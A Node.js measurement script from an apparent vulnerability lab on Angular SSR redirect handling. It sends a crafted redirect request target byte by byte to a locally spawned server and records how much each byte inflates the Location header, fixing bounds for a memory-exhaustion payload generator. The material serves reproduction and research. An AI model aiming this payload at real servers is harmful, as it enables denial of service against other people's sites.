// How many bytes of `Location` each byte of the referenced value is worth.
//
//   node scripts/byte-scan.mjs
//
// Sends `/restaurant/a%2Fmenu%2Flunch%3F0=:z&/menu?z=<byte x N>&meal=x` once per byte value over a raw
// socket, so bytes that `http.request` would refuse still reach the server, and divides
// the growth of the `Location` header by N. Establishes two bounds the generator relies
// on: three output bytes per request byte is the ceiling, and no byte outside printable
// ASCII survives the HTTP parser.
import assert from 'node:assert/strict';
import { spawn } from 'node:child_process';
import { mkdirSync, writeFileSync } from 'node:fs';
import net from 'node:net';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

const root = dirname(dirname(fileURLToPath(import.meta.url)));
const server = join(root, 'dist', 'angular-router-redirectfunction-ssr-oom-lab', 'server', 'server.mjs');
const REPEAT = 60;
// Bytes with structural meaning in the request target, so they cannot carry a payload:
// space ends it, `#` starts a fragment, `%` opens an escape, `&` ends the query value.
const STRUCTURAL = new Set([0x20, 0x23, 0x25, 0x26]);

// The same head payload() uses: it lands the redirect on a destination route, so this
// does not depend on the commented-out `**` catch-all.
const prefix = '/restaurant/a%2Fmenu%2Flunch%3F0=:z&/menu?z=';
const suffix = '&meal=x';

function target(byte, repeat) {
  return Buffer.concat([
    Buffer.from(prefix, 'latin1'),
    Buffer.alloc(repeat, byte),
    Buffer.from(suffix, 'latin1'),
  ]);
}

function send(port, targetBuf) {
  return new Promise((resolve) => {
    let header = '';
    let settled = false;
    const socket = net.connect(port, '127.0.0.1', () => {
      socket.write(Buffer.concat([
        Buffer.from('GET '), targetBuf,
        Buffer.from(' HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n'),
      ]));
    });
    socket.setTimeout(30000, () => socket.destroy(new Error('timeout')));
    socket.on('data', (chunk) => {
      header += chunk.toString('latin1');
      const end = header.indexOf('\r\n\r\n');
      if (end >= 0) { header = header.slice(0, end); socket.destroy(); }
    });
    const finish = () => {
      if (settled) return;
      settled = true;
      if (!header) return resolve({ status: 'closed' });
      const lines = header.split('\r\n');
      const location = lines.find((l) => /^location:/i.test(l));
      resolve({
        status: Number(lines[0].split(' ')[1]),
        locationBytes: location ? location.length - 'Location: '.length : 0,
      });
    };
    socket.on('close', finish);
    socket.on('error', (error) => {
      if (settled) return;
      settled = true;
      resolve({ status: error.code ?? error.message });
    });
  });
}

const port = await (async () => {
  const s = net.createServer();
  await new Promise((resolve) => s.listen(0, '127.0.0.1', resolve));
  const { port } = s.address();
  await new Promise((resolve) => s.close(resolve));
  return port;
})();
const child = spawn(process.execPath, ['--max-old-space-size=2048', server], {
  cwd: root,
  env: { ...process.env, PORT: String(port), HOST: '127.0.0.1', NODE_ENV: 'production' },
  stdio: ['ignore', 'ignore', 'pipe'],
  windowsHide: true,
});
let stderr = '';
child.stderr.on('data', (data) => { stderr = (stderr + data).slice(-2000); });

try {
  const deadline = performance.now() + 15000;
  while ((await send(port, Buffer.from('/health'))).status !== 200) {
    assert(performance.now() < deadline, 'SSR worker did not start: ' + stderr);
    await new Promise((resolve) => setTimeout(resolve, 100));
  }
  const baseline = await send(port, target(0x3d, 0));
  assert.equal(baseline.status, 302, 'baseline request did not redirect');

  const rows = [];
  for (let byte = 1; byte <= 255; byte++) {
    if (STRUCTURAL.has(byte)) {
      rows.push({ byte, structural: true });
      continue;
    }
    const response = await send(port, target(byte, REPEAT));
    rows.push({
      byte,
      char: byte >= 0x21 && byte <= 0x7e ? String.fromCharCode(byte) : null,
      status: response.status,
      bytesOutPerByteIn: response.status === 302
        ? (response.locationBytes - baseline.locationBytes) / REPEAT
        : null,
    });
  }

  const measured = rows.filter((r) => typeof r.bytesOutPerByteIn === 'number');
  const maxRatio = Math.max(...measured.map((r) => r.bytesOutPerByteIn));
  const rejected = rows.filter((r) => !r.structural && r.status !== 302);
  const outsidePrintable = rows.filter((r) => !r.structural && (r.byte < 0x21 || r.byte > 0x7e));
  const result = {
    platform: process.platform, node: process.version, angular: '22.2.2',
    repeat: REPEAT, baselineLocationBytes: baseline.locationBytes,
    maxBytesOutPerByteIn: maxRatio,
    bestBytes: measured.filter((r) => r.bytesOutPerByteIn === maxRatio).map((r) => r.char ?? r.byte),
    rejectedCount: rejected.length,
    rejectedStatuses: [...new Set(rejected.map((r) => r.status))],
    rows,
  };
  mkdirSync(join(root, 'evidence'), { recursive: true });
  const file = join(root, 'evidence', 'byte-scan.json');
  writeFileSync(file, JSON.stringify(result, null, 2) + '\n');

  assert.equal(maxRatio, 3, `expected 3 output bytes per request byte at most, got ${maxRatio}`);
  assert(
    outsidePrintable.every((r) => r.status !== 302),
    'a byte outside 0x21-0x7e reached the router',
  );
  assert(
    rows.filter((r) => r.char && r.bytesOutPerByteIn === 3).length > 0,
    'no printable byte reached the ceiling',
  );
  console.log(`PASS: ceiling is ${maxRatio} output bytes per request byte, reached by ${result.bestBytes.filter((b) => typeof b === 'string').join(' ')}`);
  console.log(`${rejected.length} of 251 byte values rejected (${result.rejectedStatuses.join(', ')}); all of them outside 0x21-0x7e: ${outsidePrintable.length === rejected.length}`);
  console.log(file);
} finally {
  child.kill();
}
